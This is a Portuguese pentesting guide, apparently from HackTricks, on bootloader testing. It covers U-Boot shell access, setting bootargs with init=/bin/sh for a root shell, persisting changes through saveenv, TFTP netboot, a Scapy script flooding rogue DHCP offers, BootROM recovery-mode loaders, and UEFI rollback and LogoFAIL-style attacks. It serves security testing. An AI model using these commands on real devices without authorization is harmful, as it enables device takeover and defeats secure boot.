# Teste de Bootloader

{{#include ../../banners/hacktricks-training.md}}

As etapas a seguir são recomendadas para modificar as configurações de inicialização do dispositivo e testar bootloaders como U-Boot e loaders da classe UEFI. Foque em obter execução de código cedo, avaliar proteções de assinatura/rollback e abusar de caminhos de recovery ou net-boot.

Related: MediaTek secure-boot bypass via bl2_ext patching:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot: ganhos rápidos e abuso do ambiente

1. Acesse o interpretador/shell
- Durante o boot, pressione uma tecla de interrupção conhecida (frequentemente qualquer tecla, 0, espaço, ou uma sequência "mágica" específica da placa) antes de `bootcmd` executar para cair no prompt do U-Boot.

2. Inspecione o estado de boot e as variáveis
- Comandos úteis:
- `printenv` (dump do ambiente)
- `bdinfo` (info da placa, endereços de memória)
- `help bootm; help booti; help bootz` (métodos suportados de boot do kernel)
- `help ext4load; help fatload; help tftpboot` (loaders disponíveis)

3. Modifique os argumentos de boot para obter um root shell
- Acrescente `init=/bin/sh` para que o kernel caia em um shell em vez do init normal:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # or: run bootcmd
```

4. Netboot a partir do seu servidor TFTP
- Configure a rede e recupere um kernel/fit image pela LAN:
```
# setenv ipaddr 192.168.2.2      # device IP
# setenv serverip 192.168.2.1    # TFTP server IP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persista alterações via ambiente
- Se o armazenamento do env não estiver protegido contra escrita, você pode persistir o controle:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Verifique variáveis como `bootcount`, `bootlimit`, `altbootcmd`, `boot_targets` que influenciam caminhos de fallback. Valores mal configurados podem permitir quebras repetidas para o shell.

6. Verifique recursos de debug/unsafe
- Procure por: `bootdelay` > 0, `autoboot` desabilitado, `usb start; fatload usb 0:1 ...` sem restrições, habilidade de `loady`/`loads` via serial, `env import` de mídia não confiável, e kernels/ramdisks carregados sem checagens de assinatura.

7. Testes de imagem/validação do U-Boot
- Se a plataforma afirma ter secure/verified boot com imagens FIT, tente imagens unsigned e manipuladas:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # should FAIL if FIT sig enforced
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # should FAIL
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # should only boot if key trusted
```
- Ausência de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ou comportamento legado `verify=n` frequentemente permite bootar payloads arbitrários.

## Superfície de netboot (DHCP/PXE) e servidores maliciosos

8. Fuzzing de parâmetros PXE/DHCP
- O manejo legacy de BOOTP/DHCP do U-Boot já teve problemas de segurança de memória. Por exemplo, CVE‑2024‑42040 descreve disclosure de memória via respostas DHCP crafted que podem leak bytes da memória do U-Boot de volta na rede. Exercite os caminhos de código DHCP/PXE com valores excessivamente longos/casuísticos (option 67 bootfile-name, vendor options, campos file/servername) e observe por travamentos/leaks.
- Snippet mínimo em Scapy para estressar parâmetros de boot durante netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Intentionally oversized and strange values
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Valide também se os campos de filename do PXE são passados para a lógica do shell/loader sem sanitização quando encadeados a scripts de provisionamento do lado do OS.

9. Teste de injeção de comandos com servidor DHCP malicioso
- Configure um serviço DHCP/PXE malicioso e tente injetar caracteres nos campos de filename ou options para alcançar interpretadores de comando em estágios posteriores da cadeia de boot. O módulo auxiliary de DHCP do Metasploit, `dnsmasq`, ou scripts customizados em Scapy funcionam bem. Isole a rede de laboratório primeiro.

## Modos de recovery BootROM do SoC que sobrescrevem o boot normal

Muitos SoCs expõem um modo BootROM "loader" que aceitará código via USB/UART mesmo quando imagens na flash são inválidas. Se os fuses do secure-boot não estiverem queimados, isso pode fornecer execução de código arbitrária muito cedo na cadeia.

- NXP i.MX (Serial Download Mode)
- Ferramentas: `uuu` (mfgtools3) ou `imx-usb-loader`.
- Exemplo: `imx-usb-loader u-boot.imx` para enviar e executar um U-Boot customizado da RAM.
- Allwinner (FEL)
- Ferramenta: `sunxi-fel`.
- Exemplo: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ou `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Ferramenta: `rkdeveloptool`.
- Exemplo: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` para stagear um loader e subir um U-Boot customizado.

Avalie se o dispositivo tem eFuses/OTP de secure-boot queimados. Se não, modos de download do BootROM frequentemente bypassam qualquer verificação de nível superior (U-Boot, kernel, rootfs) executando seu payload de primeira etapa diretamente de SRAM/DRAM.

## UEFI/bootloaders de classe PC: verificações rápidas

10. Manipulação da ESP e testes de rollback
- Monte a EFI System Partition (ESP) e verifique componentes de loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi`, caminhos de logo do vendor.
- Tente bootar com componentes assinados downgraded ou com vulnerabilidades conhecidas se as revogações do Secure Boot (dbx) não estiverem atualizadas. Se a plataforma ainda confiar em shims/bootmanagers antigos, frequentemente é possível carregar seu próprio kernel ou `grub.cfg` da ESP para obter persistência.

11. Bugs de parsing de logo (classe LogoFAIL)
- Vários firmwares OEM/IBV foram vulneráveis a falhas no parsing de imagens em DXE que processam logos de boot. Se um atacante puder colocar uma imagem craftada na ESP sob um caminho vendor-specific (por exemplo, `\EFI\<vendor>\logo\*.bmp`) e reinicializar, execução de código durante o early boot pode ser possível mesmo com Secure Boot habilitado. Teste se a plataforma aceita logos fornecidos pelo usuário e se esses caminhos são graváveis a partir do OS.

## Precauções de hardware

Tenha cautela ao interagir com SPI/NAND flash durante o early boot (por exemplo, aterrar pinos para bypassar leituras) e sempre consulte o datasheet da flash. Curts temporizados podem corromper o dispositivo ou o programmer.

## Notas e dicas adicionais

- Tente `env export -t ${loadaddr}` e `env import -t ${loadaddr}` para mover blobs de ambiente entre RAM e armazenamento; algumas plataformas permitem importar env de mídia removível sem autenticação.
- Para persistência em sistemas Linux que bootam via `extlinux.conf`, modificar a linha `APPEND` (para injetar `init=/bin/sh` ou `rd.break`) na partição de boot costuma ser suficiente quando não há checagens de assinatura.
- Se o userland prover `fw_printenv/fw_setenv`, valide que `/etc/fw_env.config` corresponde ao armazenamento real do env. Offsets mal configurados permitem ler/escrever a região MTD errada.

## Referências

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)

{{#include ../../banners/hacktricks-training.md}}
